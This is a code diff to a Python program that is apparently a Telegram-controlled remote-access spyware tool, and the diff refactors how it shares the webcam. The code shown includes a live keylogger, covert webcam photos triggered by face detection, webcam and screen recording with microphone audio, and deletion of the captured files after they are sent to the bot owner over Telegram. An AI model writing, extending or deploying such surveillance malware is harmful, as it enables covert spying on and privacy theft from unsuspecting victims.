@@ -513,7 +513,7 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int, mixer: CustomMixer) -> None:
+    def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture) -> None:
         self.token = token
         self.help = HELP
         self.page = 0
@@ -523,6 +523,7 @@ class PeppinoTelegram:
         self.duckyhelp = DUCKYHELP
         self.explorer_path = getcwd()
         self.audio_mixer = mixer
+        self.cap = capture
         self.explorer_message = None
         #converts text to functions
         self.function_table: dict[str:Callable] = {
@@ -590,6 +591,14 @@ class PeppinoTelegram:
     
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label="Choose an option: ", page=0, next_btn: bool=False) -> ButtonsMenu:
         return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn)
+
+    def opencap(self) -> None:
+        if not self.cap.isOpened():
+            self.cap.open(0)
+
+    def closecap(self) -> None:
+        if self.cap.isOpened():
+            self.cap.release()
     
     def bsend(self, text: str, retries=0) -> int|None:
         if retries>3:
@@ -705,7 +714,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         self.bsend("Live keylogger done")
 
     def checkforface(self) -> None:
-        res, frame = detect_face()
+        res, frame = detect_face(self.cap)
         if res:
             self.bsend("Face found")
         else:
@@ -713,7 +722,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
     
     def waitforface(self, timeout=60):
         start = time()
-        cap = VideoCapture(0)
+        self.opencap()
+        cap = self.cap
         while time()-start < timeout:
             res, frame = detect_face(cap)
             if frame is None:
@@ -723,9 +733,9 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
                 filename = randompngname()
                 imwrite(filename, frame)
                 self.__send_image(filename)
-                cap.release()
                 remove(filename)
                 break
+        self.closecap()
     
     def record_screen(self, duration: int=5, caption: str|None=None) -> None:
         duration = int(duration)
@@ -779,7 +789,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
             audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
             fourcc = VideoWriter_fourcc(*'XVID')
-            webcam = VideoCapture(0)
+            self.opencap()
+            webcam = self.cap
             width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
             height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
             out = VideoWriter(filename, fourcc, 20.0, (width, height))
@@ -800,7 +811,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             bar.set100()
             sd.wait()
             out.release()
-            webcam.release()
+            self.closecap()
             sf.write(audio_filename, audio_data, samplerate)
             video_clip = VideoFileClip(filename)
             audio_clip = AudioFileClip(audio_filename)
@@ -827,7 +838,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             SCREEN_SIZE = tuple(pg.size())
             fourcc = VideoWriter_fourcc(*'XVID')
             out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
-            webcam = VideoCapture(0)
+            self.opencap()
+            webcam = self.cap
             start_time = time()
             samplerate = 44100
             channels = 1
@@ -851,7 +863,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             bar.set100()
             sd.wait()
             out.release()
-            webcam.release()
+            self.closecap()
             sf.write(audio_filename, audio_data, samplerate)
             video_clip = VideoFileClip(filename)
             audio_clip = AudioFileClip(audio_filename)
@@ -909,14 +921,15 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
     def selphie(self, caption: str|None=None) -> None:
         try:
             filename = join(BURN_DIRECTORY,randompngname())
-            camera = VideoCapture(0)
+            self.opencap()
+            camera = self.cap
             return_value, image = camera.read()
             if not return_value:
                 raise Exception("Could not find camera")
             imwrite(filename, image)
-            del(camera)
             self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption)
             remove(filename)
+            self.closecap()
         except Exception as e:
             self.bsend(f"Something has happened while getting webcam\n {e}")
 
@@ -1115,5 +1128,6 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
 if __name__ == "__main__":
     token, chat_id = getCred() 
     mixer = CustomMixer()
-    pep2 = PeppinoTelegram(token,chat_id,mixer)
+    capture = VideoCapture(0)
+    pep2 = PeppinoTelegram(token,chat_id,mixer,capture)
     pep2.start()
